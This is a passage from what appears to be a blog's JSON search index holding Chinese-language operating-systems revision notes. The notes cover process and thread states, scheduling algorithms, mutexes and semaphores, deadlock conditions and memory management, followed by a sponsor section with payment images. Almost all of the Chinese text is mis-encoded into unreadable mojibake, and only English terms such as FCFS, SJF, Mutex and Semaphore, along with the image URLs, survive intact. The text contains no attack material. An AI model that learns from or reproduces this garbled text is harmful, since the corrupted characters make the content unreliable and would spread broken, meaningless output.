â¸è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€\n\n- **åˆ›å»ºçŠ¶æ€(new)** ï¼šè¿›ç¨‹æ­£åœ¨è¢«åˆ›å»ºï¼Œå°šæœªåˆ°å°±ç»ªçŠ¶æ€ã€‚\n\n- **å°±ç»ªçŠ¶æ€(ready)** ï¼šè¿›ç¨‹å·²å¤„äºå‡†å¤‡è¿è¡ŒçŠ¶æ€ï¼Œå³è¿›ç¨‹è·å¾—äº†é™¤äº†å¤„ç†å™¨ä¹‹å¤–çš„ä¸€åˆ‡æ‰€éœ€èµ„æºï¼Œä¸€æ—¦å¾—åˆ°å¤„ç†å™¨èµ„æº(å¤„ç†å™¨åˆ†é…çš„æ—¶é—´ç‰‡)å³å¯è¿è¡Œã€‚\n\n- **è¿è¡ŒçŠ¶æ€(running)** ï¼šè¿›ç¨‹æ­£åœ¨å¤„ç†å™¨ä¸Šè¿è¡Œ(å•æ ¸ CPU ä¸‹ä»»æ„æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¤„äºè¿è¡ŒçŠ¶æ€)ã€‚\n\n- **é˜»å¡çŠ¶æ€(waiting)** ï¼šåˆç§°ä¸ºç­‰å¾…çŠ¶æ€ï¼Œè¿›ç¨‹æ­£åœ¨ç­‰å¾…æŸä¸€äº‹ä»¶è€Œæš‚åœè¿è¡Œå¦‚ç­‰å¾…æŸèµ„æºä¸ºå¯ç”¨æˆ–ç­‰å¾… IO æ“ä½œå®Œæˆã€‚å³ä½¿å¤„ç†å™¨ç©ºé—²ï¼Œè¯¥è¿›ç¨‹ä¹Ÿä¸èƒ½è¿è¡Œã€‚\n\n- **ç»“æŸçŠ¶æ€(terminated)** ï¼šè¿›ç¨‹æ­£åœ¨ä»ç³»ç»Ÿä¸­æ¶ˆå¤±ã€‚å¯èƒ½æ˜¯è¿›ç¨‹æ­£å¸¸ç»“æŸæˆ–å…¶ä»–åŸå› ä¸­æ–­é€€å‡ºè¿è¡Œã€‚\n\n![](https://img.jwt1399.top/img/202211251026928.png)\n\n\n\n### â¹è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•\n\n- å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFCFSï¼‰\n  - ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªæœ€å…ˆè¿›å…¥è¯¥é˜Ÿåˆ—çš„è¿›ç¨‹ä¸ºä¹‹åˆ†é…èµ„æºï¼Œä½¿å®ƒç«‹å³æ‰§è¡Œå¹¶ä¸€ç›´æ‰§è¡Œåˆ°å®Œæˆæˆ–å‘ç”ŸæŸäº‹ä»¶è€Œè¢«é˜»å¡æ”¾å¼ƒå ç”¨ CPU æ—¶å†é‡æ–°è°ƒåº¦ã€‚\n- çŸ­ä½œä¸šä¼˜å…ˆï¼ˆSJFï¼‰\n  - ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰å‡ºä¸€ä¸ªä¼°è®¡è¿è¡Œæ—¶é—´æœ€çŸ­çš„è¿›ç¨‹ä¸ºä¹‹åˆ†é…èµ„æºï¼Œä½¿å®ƒç«‹å³æ‰§è¡Œå¹¶ä¸€ç›´æ‰§è¡Œåˆ°å®Œæˆæˆ–å‘ç”ŸæŸäº‹ä»¶è€Œè¢«é˜»å¡æ”¾å¼ƒå ç”¨ CPU æ—¶å†é‡æ–°è°ƒåº¦ã€‚\n- ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ï¼ˆPSAï¼‰\n  - ä¸ºæ¯ä¸ªæµç¨‹åˆ†é…ä¼˜å…ˆçº§ï¼Œé¦–å…ˆæ‰§è¡Œå…·æœ‰æœ€é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ï¼Œä¾æ­¤ç±»æ¨ã€‚å…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„è¿›ç¨‹ä»¥ FCFS æ–¹å¼æ‰§è¡Œã€‚å¯ä»¥æ ¹æ®å†…å­˜è¦æ±‚ï¼Œæ—¶é—´è¦æ±‚æˆ–ä»»ä½•å…¶ä»–èµ„æºè¦æ±‚æ¥ç¡®å®šä¼˜å…ˆçº§ã€‚\n- é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•ï¼ˆHRRNï¼‰\n  - æ ¹æ®â€œå“åº”æ¯” =ï¼ˆè¿›ç¨‹æ‰§è¡Œæ—¶é—´+è¿›ç¨‹ç­‰å¾…æ—¶é—´ï¼‰/ è¿›ç¨‹æ‰§è¡Œæ—¶é—´â€è¿™ä¸ªå…¬å¼å¾—åˆ°çš„å“åº”æ¯”æ¥è¿›è¡Œè°ƒåº¦ã€‚\n  - ä¼˜ç‚¹æ˜¯å…¼é¡¾é•¿çŸ­ä½œä¸šï¼Œç¼ºç‚¹æ˜¯è®¡ç®—å“åº”æ¯”å¼€é”€å¤§ï¼Œé€‚ç”¨äºæ‰¹å¤„ç†ç³»ç»Ÿã€‚\n  - **FCFSæ–¹å¼åªè€ƒè™‘æ¯ä¸ªä½œä¸šçš„ç­‰å¾…æ—¶é—´è€Œæœªè€ƒè™‘æ‰§è¡Œæ—¶é—´çš„é•¿çŸ­ï¼›**\n  - **SJFæ–¹å¼åªè€ƒè™‘æ‰§è¡Œæ—¶é—´è€Œæœªè€ƒè™‘ç­‰å¾…æ—¶é—´çš„é•¿çŸ­**ã€‚\n\n- æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³• ï¼ˆRRï¼‰\n  - æ¯ä¸ªè¿›ç¨‹è¢«åˆ†é…ä¸€ä¸ªæ—¶é—´æ®µï¼Œç§°ä½œå®ƒçš„æ—¶é—´ç‰‡ï¼Œå³è¯¥è¿›ç¨‹å…è®¸è¿è¡Œçš„æ—¶é—´ã€‚\n\n### âºçº¿ç¨‹æœ‰å¤šå°‘ç§çŠ¶æ€\n\n1. **Newï¼ˆæ–°å»º**ï¼‰ï¼šå°šæœªå¯åŠ¨çš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n2. **Runnableï¼ˆè¿è¡Œï¼‰**ï¼šåœ¨Javaè™›æ‹Ÿæœºä¸­æ‰§è¡Œçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n3. **Blockedï¼ˆé˜»å¡ï¼‰**ï¼šè¢«é˜»å¡ç­‰å¾…ç›‘è§†å™¨é”å®šçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n4. **Waitingï¼ˆç­‰å¾…ï¼‰**ï¼šæ­£åœ¨ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç‰¹å®šåŠ¨ä½œçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n5. **Timed Waitingï¼ˆè®¡æ—¶ç­‰å¾…ï¼‰**ï¼šæ­£åœ¨ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒåŠ¨ä½œè¾¾åˆ°æŒ‡å®šç­‰å¾…æ—¶é—´çš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n6. **Terminatedï¼ˆç»ˆæ­¢ï¼‰**ï¼šå·²é€€å‡ºçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n\n![](https://img.jwt1399.top/img/202211261112909.png)\n\n### â»å¹¶å‘&å¹¶è¡Œ\n\n**å¹¶å‘**ï¼šåŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªä»»åŠ¡**äº¤æ›¿æ‰§è¡Œ**ã€‚å•æ ¸ cpu å®ç°çš„å¤šä»»åŠ¡å°±æ˜¯å¹¶å‘ã€‚ä¾‹å¦‚ï¼šTom è¾¹å¼€è½¦è¾¹æ¥ç”µè¯\n\n**å¹¶è¡Œ**ï¼šåŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªä»»åŠ¡**åŒæ—¶æ‰§è¡Œ**ã€‚å¤šæ ¸ cpu å¯ä»¥å®ç°å¹¶è¡Œã€‚ä¾‹å¦‚ï¼šTom å¼€è½¦ ï¼ŒJack æ¥ç”µè¯\n\n### â¼çº¿ç¨‹é—´çš„åŒæ­¥çš„æ–¹å¼\n\n1. **äº’æ–¥é‡(Mutex)**ï¼šé‡‡ç”¨äº’æ–¥å¯¹è±¡æœºåˆ¶ï¼Œåªæœ‰æ‹¥æœ‰äº’æ–¥å¯¹è±¡çš„çº¿ç¨‹æ‰æœ‰è®¿é—®å…¬å…±èµ„æºçš„æƒé™ã€‚æ¯”å¦‚ Java ä¸­çš„ synchronized å…³é”®è¯å’Œå„ç§ Lock éƒ½æ˜¯è¿™ç§æœºåˆ¶ã€‚\n2. **ä¿¡å·é‡(Semaphore)** ï¼šå®ƒå…è®¸åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€èµ„æºï¼Œä½†æ˜¯éœ€è¦æ§åˆ¶åŒä¸€æ—¶åˆ»è®¿é—®æ­¤èµ„æºçš„æœ€å¤§çº¿ç¨‹æ•°é‡ã€‚\n3. **äº‹ä»¶(Event)** :Wait/Notifyï¼šé€šè¿‡é€šçŸ¥æ“ä½œçš„æ–¹å¼æ¥ä¿æŒå¤šçº¿ç¨‹åŒæ­¥ï¼Œæ–¹ä¾¿çš„å®ç°å¤šçº¿ç¨‹ä¼˜å…ˆçº§çš„æ¯”è¾ƒæ“ä½œã€‚\n\n### â½æ­»é”\n\n> æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„çº¿ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡ã€‚è‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å»ã€‚\n\n**æ­»é”äº§ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶**\n\n- **äº’æ–¥**ï¼šä¸€ä¸ªèµ„æºæ¯æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨\n\n- **ä¸å¯å¼ºå **ï¼šä»»ä¸€è¿›ç¨‹ä¸èƒ½ä»å¦ä¸€è¿›ç¨‹é‚£é‡ŒæŠ¢å¤ºèµ„æº\n\n- **è¯·æ±‚å’Œä¿æŒ**ï¼šä¸€ä¸ªè¿›ç¨‹è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œä¸é‡Šæ”¾å·²å æœ‰çš„èµ„æº\n\n- **å¾ªç¯ç­‰å¾…**ï¼šè¿›ç¨‹ä¹‹é—´å¾ªç¯ç­‰å¾…ç€èµ„æº\n\n**è§£å†³æ­»é”çš„æ–¹æ³•**\n\n- **é¢„é˜²æ­»é”**ï¼šé‡‡ç”¨ç­–ç•¥**é™åˆ¶å¹¶å‘è¿›ç¨‹å¯¹èµ„æºçš„è¯·æ±‚**ï¼Œä½¿å¾—æ­»é”çš„å¿…è¦æ¡ä»¶åœ¨ç³»ç»Ÿæ‰§è¡Œçš„ä»»ä½•æ—¶é—´ä¸Šéƒ½ä¸æ»¡è¶³ã€‚\n- **é¿å…æ­»é”**ï¼šç³»ç»Ÿåœ¨åˆ†é…èµ„æºæ—¶ï¼Œæ ¹æ®èµ„æºçš„ä½¿ç”¨æƒ…å†µ**æå‰åšå‡ºé¢„æµ‹**ï¼Œä»è€Œ**é¿å…æ­»é”çš„å‘ç”Ÿ**\n- **æ£€æµ‹æ­»é”**ï¼šè®¾**ä¸“é—¨çš„æœºæ„**ï¼Œå½“æ­»é”å‘ç”Ÿæ—¶ï¼Œèƒ½å¤Ÿæ£€æµ‹æ­»é”çš„å‘ç”Ÿï¼Œå¹¶ç²¾ç¡®åœ°ç¡®å®šä¸æ­»é”æœ‰å…³çš„è¿›ç¨‹å’Œèµ„æºã€‚\n- **è§£é™¤æ­»é”**ï¼šä¸æ£€æµ‹æ­»é”é…å¥—çš„ä¸€ç§æªæ–½ï¼Œç”¨äº**å°†è¿›ç¨‹ä»æ­»é”çŠ¶æ€ä¸‹è§£è„±å‡ºæ¥**ã€‚\n\n## â‘¡å†…å­˜ç®¡ç†\n\n\n\n\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["è®¡ç½‘"],"categories":["CSåŸºç¡€"]},{"title":"æ“ä½œç³»ç»Ÿå¤ä¹ ","url":"/posts/55434.html","content":"## ç¬¬ä¸€ç«  æ¦‚è¿°\n\n**1ã€æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µã€åŸºæœ¬ç±»å‹ã€åŸºæœ¬ç‰¹å¾åŠåŸºæœ¬åŠŸèƒ½**\n\næ¦‚å¿µï¼šOS æ˜¯æ ¸å¿ƒç³»ç»Ÿè½¯ä»¶ï¼Œè´Ÿè´£è®¡ç®—æœºç³»ç»Ÿã€ç¡¬ä»¶èµ„æºçš„åˆ†é…å’Œä½¿ç”¨ï¼›æ§åˆ¶å’Œåè°ƒå¹¶å‘æ´»åŠ¨ï¼›æä¾›ç”¨æˆ·æ¥å£ï¼Œä½¿ç”¨æˆ·è·å¾—è‰¯å¥½çš„å·¥ä½œç¯å¢ƒ\n\nåŸºæœ¬ç±»å‹ï¼š\n\n1.\tæ‰¹é‡æ“ä½œç³»ç»Ÿï¼šå°†ç”¨æˆ·æäº¤çš„ä½œä¸šæˆæ‰¹çš„é€å…¥è®¡ç®—æœºï¼Œç„¶åç”±ä½œä¸šè°ƒåº¦ç¨‹åºè‡ªåŠ¨é€‰æ‹©ä½œä¸šè¿è¡Œ\n2.\tåˆ†æ—¶æ“ä½œç³»ç»Ÿï¼šé‡‡ç”¨æ—¶é—´ç‰‡è½®è½¬çš„åŠæ³•ï¼Œä½¿ä¸€å°è®¡ç®—æœºåŒæ—¶ä¸ºå¤šä¸ªç»ˆç«¯ç”¨æˆ·æœåŠ¡\n3.\tå®æ—¶æ“ä½œç³»ç»Ÿï¼šå¯¹å¤–éƒ¨è¾“å…¥çš„ä¿¡æ¯ï¼Œèƒ½åœ¨è§„å®šçš„æ—¶é—´å†…å¤„ç†å®Œæ¯•å¹¶åšå‡ºååº”\n4.\tä¸ªäººè®¡ç®—æœºæ“ä½œç³»ç»Ÿï¼š\n5.\tç½‘ç»œæ“ä½œç³»ç»Ÿ\n6.\tåˆ†å¸ƒå¼æ“ä½œç³»ç»Ÿï¼šæœåŠ¡åˆ†å¸ƒåŒ–\n\nåŸºæœ¬ç‰¹å¾ï¼šå¹¶å‘ã€å…±äº«ã€è™šæ‹Ÿã€å¼‚æ­¥\n\n- å¹¶å‘ï¼šä¸¤æˆ–å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿ\n- å…±äº«ï¼šæŒ‡ç³»ç»Ÿä¸­èµ„æºå¯ä¾›å†…å­˜ä¸­å¤šä¸ªå¹¶å‘æ‰§è¡Œçš„è¿›ç¨‹å…±åŒä½¿ç”¨\n- è™šæ‹Ÿï¼šé€šè¿‡æŸç§æŠ€æœ¯æŠŠä¸€ä¸ªç‰©ç†å®ä½“å˜ä¸ºè‹¥å¹²ä¸ªé€»è¾‘ä¸Šçš„å¯¹åº”ç‰©\n- å¼‚æ­¥ï¼ˆä¸ç¡®å®šæ€§ï¼‰ï¼šè¿è¡Œè¿›åº¦ä¸å¯é¢„çŸ¥\n\nåŸºæœ¬åŠŸèƒ½ï¼šå¤„ç†æœºç®¡ç†ã€å­˜å‚¨å™¨ç®¡ç†ã€è®¾å¤‡ç®¡ç†ã€æ–‡ä»¶ç³»ç»Ÿç®¡ç†ã€‚è¿˜æœ‰ä¸ºç”¨æˆ·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›äº†ç”¨æˆ·æ¥å£\n\n**2ã€æ“ä½œç³»ç»Ÿçš„ç»“æ„è®¾è®¡æ–¹æ³•**\n\n## ç¬¬äºŒç«  è¿›ç¨‹ç®¡ç†\n\n**1ã€å¤šé“ç¨‹åºè®¾è®¡æŠ€æœ¯**\n\nå¤šé“ç¨‹åºè®¾è®¡æŠ€æœ¯æ˜¯åœ¨è®¡ç®—æœºå†…å­˜ä¸­åŒæ—¶å­˜æ”¾å‡ é“ç›¸äº’ç‹¬ç«‹çš„ç¨‹åºï¼Œä½¿å®ƒä»¬åœ¨ç®¡ç†ç¨‹åºæ§åˆ¶ä¸‹ï¼Œç›¸äº’ç©¿æ’è¿è¡Œ\n\n**2ã€è¿›ç¨‹çš„æ¦‚å¿µã€ç‰¹å¾ã€åŸºæœ¬çŠ¶æ€åŠä¸ç¨‹åºçš„åŒºåˆ«å’Œè”ç³»**\n\næ¦‚å¿µï¼šè¿›ç¨‹æ˜¯æŒ‡ä¸€ä¸ªå…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºå…³äºæŸä¸ªæ•°æ®é›†åˆçš„ä¸€æ¬¡æ‰§è¡Œæ´»åŠ¨\nç‰¹å¾ï¼šåŠ¨æ€æ€§ï¼Œå¹¶å‘æ€§ï¼Œç‹¬ç«‹æ€§ï¼Œå¼‚æ­¥æ€§\nåŸºæœ¬çŠ¶æ€ï¼šå°±ç»ªçŠ¶æ€ã€è¿è¡ŒçŠ¶æ€ã€ç­‰å¾…çŠ¶æ€\nå°±ç»ªï¼ˆè¿›ç¨‹è°ƒåº¦ï¼‰â†’è¿è¡Œï¼ˆæœåŠ¡è¯·æ±‚I/Oï¼‰â†’ç­‰å¾…çŠ¶æ€ï¼ˆæœåŠ¡å®Œæˆ/ äº‹ä»¶æ¥åˆ°ï¼‰â†’å°±ç»ªçŠ¶æ€\n\n![](https://img.jwt1399.top//img/20201220161055.png)\n\n![](https://img.jwt1399.top//img/20201220161116.png)\n\n![](https://img.jwt1399.top//img/20201220161126.png)\n\n\n\n**3ã€PCB çš„æ¦‚å¿µã€å‰è¶‹å›¾ä¸è¿›ç¨‹å›¾**\n\n**4ã€åŸè¯­çš„æ¦‚å¿µåŠè¿›ç¨‹æ§åˆ¶åŸè¯­çš„ç§ç±»**\n\nåŸè¯­æ˜¯æ“ä½œç³»ç»Ÿä¸­å®Œæˆä¸€äº›ç‰¹å®šåŠŸèƒ½çš„ã€ä¸å¯ä¸­æ–­çš„è¿‡ç¨‹\n\nåŸè¯­çš„ç§ç±»ï¼š \n\n- è¿›ç¨‹æ§åˆ¶åŸè¯­\n- åˆ›å»ºåŸè¯­ï¼ˆåˆ†é…PCBåŠèµ„æºï¼‰ã€æ’¤é”€åŸè¯­ï¼ˆæ’¤é”€PCBå¹¶å½’è¿˜èµ„æºï¼‰\n- é˜»å¡åŸè¯­ï¼ˆé˜»å¡åçš„è¿›ç¨‹åªèƒ½ç”±å…¶ä»–è¿›ç¨‹å”¤é†’ï¼‰\n- å”¤é†’åŸè¯­ï¼ˆä¸€èˆ¬æ‰§è¡Œæ­¤è¯­å¥çš„è¿›ç¨‹ä¸è¢«å”¤é†’è¿›ç¨‹æ˜¯åˆä½œçš„å¹¶å‘è¿›ç¨‹ï¼Œå”¤é†’åŸè¯­çš„æœ€åä¸€æ­¥å¯ä»¥è½¬è¿›ç¨‹è°ƒåº¦ï¼Œä¹Ÿå¯ä»¥è¿”å›ç°è¡Œè¿›ç¨‹ï¼‰\n\n**5ã€è¿›ç¨‹çš„åŒæ­¥ä¸äº’æ–¥çš„æ¦‚å¿µã€ä¸´ç•Œèµ„æºä¸ä¸´ç•ŒåŒºçš„æ¦‚å¿µ**\n\nè¿›ç¨‹çš„åŒæ­¥ï¼šå¹¶å‘è¿›ç¨‹åœ¨ä¸€äº›å…³é”®ç‚¹ä¸Šå¯èƒ½éœ€è¦äº’ç›¸ç­‰å¾…ä¸äº’é€šæ¶ˆæ¯ï¼Œè¿™ç§ç›¸äº’åˆ¶çº¦çš„ç­‰å¾…ä¸äº’é€šæ¶ˆæ¯ç§°ä¸ºè¿›ç¨‹çš„åŒæ­¥\n\nè¿›ç¨‹çš„äº’æ–¥ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“æŸä¸€è¿›ç¨‹æ­£åœ¨è®¿é—®æŸä¸€å­˜å‚¨åŒºåŸŸæ—¶ï¼Œä¸å…è®¸å…¶ä»–è¿›ç¨‹æ¥è¯»å‡ºæˆ–è€…ä¿®æ”¹å­˜å‚¨åŒºçš„å†…å®¹ï¼Œå¦åˆ™å°±ä¼šå‘ç”Ÿåæœæ— æ³•ä¼°è®¡çš„é”™è¯¯\n\nä¸´ç•Œèµ„æºï¼šé€šå¸¸æŠŠä¸€æ¬¡ä»…å…è®¸ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨çš„èµ„æºç§°ä¸ºä¸´ç•Œèµ„æº\nä¸´ç•ŒåŒºï¼šè¿›ç¨‹è®¿é—®ä¸´ç•Œèµ„æºçš„é‚£æ®µä»£ç \n\n**6ã€ä¿¡å·é‡åŠå…¶åº”ç”¨**\n\n**7ã€çº¿ç¨‹çš„æ¦‚å¿µåŠç§ç±»ã€å¼•å…¥çº¿ç¨‹çš„ç›®çš„**\n\nçº¿ç¨‹æ˜¯è¿›ç¨‹å†…çš„ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„å¯è°ƒåº¦çš„æ‰§è¡Œå•å…ƒï¼Œä¸€ä¸ªè¿›ç¨‹å¯å«æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œå®ƒä»¬å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œå…±äº«è¿›ç¨‹çš„å…¨éƒ¨èµ„æºã€‚\n\nå¼•å…¥çº¿ç¨‹çš„ç›®çš„ï¼šå‡å°ç¨‹åºåœ¨å¹¶å‘æ‰§è¡Œæ—¶æ‰€ä»˜å‡ºçš„æ—¶ç©ºå¼€é”€ï¼Œæé«˜æ“ä½œç³»ç»Ÿçš„å¹¶å‘æ€§èƒ½ã€‚\n\n## ç¬¬ä¸‰ç«  å¤„ç†æœºè°ƒåº¦ä¸æ­»é”\n**1ã€è°ƒåº¦çš„å±‚æ¬¡ä¸ä½œç”¨**\n\nï¼ˆ1ï¼‰é«˜çº§è°ƒåº¦ï¼ˆä½œä¸šè°ƒåº¦ã€é•¿ç¨‹è°ƒåº¦ã€å®è§‚è°ƒåº¦ï¼‰\nï¼ˆ2ï¼‰ä½çº§è°ƒåº¦ï¼ˆè¿›ç¨‹è°ƒåº¦ã€çŸ­ç¨‹è°ƒåº¦ï¼‰\nï¼ˆ3ï¼‰ä¸­çº§è°ƒåº¦ï¼ˆå†…å­˜è°ƒåº¦ï¼‰\n\n<img src=\"https://img.jwt1399.top//img/20201220161150.png\" style=\"zoom:50%;\" />\n\n**2ã€å¸¸ç”¨è°ƒåº¦ç®—æ³•åŠè®¡ç®—**\n\n- å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFCFSï¼‰\n- çŸ­ä½œä¸šä¼˜å…ˆï¼ˆSJFï¼‰\n- ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ï¼ˆPSAï¼‰\n- é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•ï¼ˆHRRNï¼‰\n\n**3ã€æ­»é”çš„æ¦‚å¿µã€äº§ç”Ÿçš„åŸå› åŠå¿…è¦æ¡ä»¶**\n\næ¦‚å¿µï¼šä¸€ç»„å¹¶å‘è¿›ç¨‹å½¼æ­¤æ— ä¼‘æ­¢åœ°ç­‰å¾…å¯¹æ–¹å ç”¨çš„èµ„æºï¼Œä»è€Œé€ æˆä¸èƒ½ç»§ç»­å‘å‰æ¨è¿›çš„çŠ¶æ€ï¼Œç§°ä¸ºè¿›ç¨‹çš„æ­»é”ã€‚\n\näº§ç”Ÿçš„åŸå› ï¼šå¹¶å‘è¿›ç¨‹çš„èµ„æºç«äº‰\n\n- 1.ç”±äºå¤šæ•°èµ„æºæ˜¯äº’æ–¥åœ°ä½¿ç”¨ï¼Œæœ‰å¤šä¸ªå¹¶å‘è¿›ç¨‹æ—¶ç³»ç»Ÿèµ„æºä¸è¶³\n- 2.è¿›ç¨‹æ¨è¿›ä¸åˆç†\n\nå¿…è¦æ¡ä»¶ï¼šäº’æ–¥ä½¿ç”¨ã€ä¸å¯å¼ºå ã€è¯·æ±‚å’Œä¿æŒã€å¾ªç¯ç­‰å¾…\n\n- äº’æ–¥ä½¿ç”¨ï¼šè¿›ç¨‹åº”äº’æ–¥ä½¿ç”¨èµ„æºï¼Œä»»æ„æ—¶åˆ»ä¸€ä¸ªèµ„æºä»…ä¸ºä¸€ä¸ªè¿›ç¨‹ç‹¬å ï¼Œè‹¥å¦ä¸€ä¸ªè¿›ç¨‹è¯·æ±‚ä¸€ä¸ªå·²è¢«å ç”¨çš„èµ„æºæ—¶ï¼Œå°±æŠŠè¿™ä¸ªè¿›ç¨‹ç½®æˆç­‰å¾…çŠ¶æ€ï¼ŒçŸ¥é“å ç”¨è€…é‡Šæ”¾èµ„æº\n- ä¸å¯å¼ºå ï¼šä»»ä¸€è¿›ç¨‹ä¸èƒ½ä»å¦ä¸€è¿›ç¨‹é‚£é‡ŒæŠ¢å¤ºèµ„æº\n- è¯·æ±‚å’Œä¿æŒï¼šä¸€ä¸ªè¿›ç¨‹è¯·æ±‚èµ„æºå¾—ä¸åˆ°æ»¡è¶³è€Œç­‰å¾…æ—¶ï¼Œä¸é‡Šæ”¾å·²å æœ‰çš„èµ„æº\n- å¾ªç¯ç­‰å¾…ï¼šå­˜åœ¨ä¸€ä¸ªå¾ªç¯ç­‰å¾…é“¾ï¼Œå…¶ä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹åˆ†åˆ«ç­‰å¾…å®ƒå‰ä¸€ä¸ªè¿›ç¨‹æ‰€æŒæœ‰çš„èµ„æºï¼Œé€ æˆæ°¸è¿œç­‰å¾…\n\n**4ã€å¤„ç†æ­»é”çš„åŸºæœ¬æ–¹æ³•**\n\n`é¢„é˜²æ­»é”ã€é¿å…æ­»é”ã€æ£€æµ‹æ­»é”ã€è§£é™¤æ­»é” `\n\n![](https://img.jwt1399.top//img/20201220161218.png)\n\n**5ã€é“¶è¡Œå®¶ç®—æ³•åŠè®¡ç®—**\n\n![](https://img.jwt1399.top//img/20201220161238.png)\n\n## ç¬¬å››ç«  å­˜å‚¨ç®¡ç†\n\n**1ã€å­˜å‚¨ç®¡ç†çš„ç›®çš„åŠåŠŸèƒ½**\n\nå­˜å‚¨ç®¡ç†çš„ç›®çš„ï¼šè§£å†³å¤šé“ä½œä¸šçš„ä¸»å­˜ç©ºé—´çš„åŠ¨æ€åˆ†é…é—®é¢˜ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡å¹¶æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ä¸»å­˜\n\nå­˜å‚¨ç®¡ç†çš„åŠŸèƒ½ï¼šåœ°å€æ˜ å°„ã€ä¸»å­˜åˆ†é…ã€ä¸»å­˜ä¿æŠ¤ã€è™šæ‹Ÿä¸»å­˜\n\n**2ã€é‡å®šä½çš„æ¦‚å¿µåŠæ–¹æ³•**\n\né‡å®šä½çš„æ¦‚å¿µï¼šæŠŠé€»è¾‘åœ°å€è½¬æ¢ä¸ºå†…å­˜çš„ç‰©ç†åœ°å€çš„è¿‡ç¨‹\n\næ–¹æ³•ï¼š\n\n- é™æ€é‡å®šä½ï¼šåœ¨ç¨‹åºè£…å…¥è¿‡ç¨‹ä¸­ã€éšå³è¿›è¡Œçš„åœ°å€å˜æ¢ï¼Œç”±è£…å…¥è½¯ä»¶å®Œæˆ\n- åŠ¨æ€é‡å®šä½ï¼šé€šè¿‡ä¸€ä¸ªåœ°å€å˜æ¢æœºæ„å°†è™šåœ°å€å˜æ¢ä¸ºä¸»å­˜çš„ç‰©ç†åœ°å€ï¼Œå¹¶ä¸”æ˜¯åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œéœ€ç¡¬ä»¶æ”¯æŒ\n\n**3ã€å†…ç¢ç‰‡ä¸å¤–ç¢ç‰‡**\n\nå†…ç¢ç‰‡ï¼šåˆ†é…ç»™ä½œä¸šçš„å­˜å‚¨ç©ºé—´ä¸­`æœªè¢«åˆ©ç”¨çš„éƒ¨åˆ†`\nå¤–ç¢ç‰‡ï¼šç³»ç»Ÿä¸­`æ— 